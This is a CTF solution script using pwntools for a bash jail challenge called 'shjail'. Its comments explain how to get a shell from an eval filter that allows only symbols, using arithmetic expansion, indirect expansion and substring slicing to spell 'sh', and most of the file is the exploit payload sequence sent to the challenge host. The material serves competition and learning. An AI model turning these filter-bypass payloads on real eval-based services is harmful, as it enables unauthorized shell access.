from pwn import *

'''
shjail: the challenge call eval with our input but only allow some characters:

^[$>_=:!(){}]+$

^  match start of the regex or negate the string match within []
[] test expression
$  variable expressions


the first thing come up with my mind is to get shell: `eval sh`

** How to construct a `sh` string?

we notice that there is a 's' char in $1 argument which is `yooooooo_mama_test,pty,stderr`
and 'h' in $_ which is last argument of preview command `echo`

leverage slices we can get the target char. but there is a problem that digits is not allowed.

** How to construct digits?

The arithmetic expansion is the answer! the special variable $$ is the pid of current command and
> = arithmetic operator is allowed. so:

$(($$>$$)) will product 0
$(($$==$$)) will product 1

** How to extract $1 argument?

Indirect expansion, refer https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html
'''

host = 'minijail-c91226694f28499c.challs.tfcctf.com'
port = 1337

io = remote(host, port, ssl=True)

MANNER = b'caca$ '

io.sendlineafter(MANNER, b'__=$(($$>$$))') # 0
io.sendlineafter(MANNER, b'___=$(($$==$$))') # 1

io.sendlineafter(MANNER, b'____=${!___}') # get $1 argument which contain 's'
io.sendlineafter(MANNER, b'_____=$_') # get last argument of preview command which contain 'h'

# slices to get target 'h'
io.sendlineafter(MANNER, b'_____=${_____:$___:$___$__}')
io.sendlineafter(MANNER, b'_____=${_____:$___:$___}')

# slices to get target 's' which index of 16
io.sendlineafter(MANNER, b'____=${____:$___$___:$___$__}')
io.sendlineafter(MANNER, b'____=${____:$___:$___$__}')
io.sendlineafter(MANNER, b'____=${____:$___:$___$__}')
io.sendlineafter(MANNER, b'____=${____:$___:$___$__}')
io.sendlineafter(MANNER, b'____=${____:$___:$___$__}')
io.sendlineafter(MANNER, b'____=${____:$___:$___}')

io.sendlineafter(MANNER, b'$____$_____')

io.interactive()




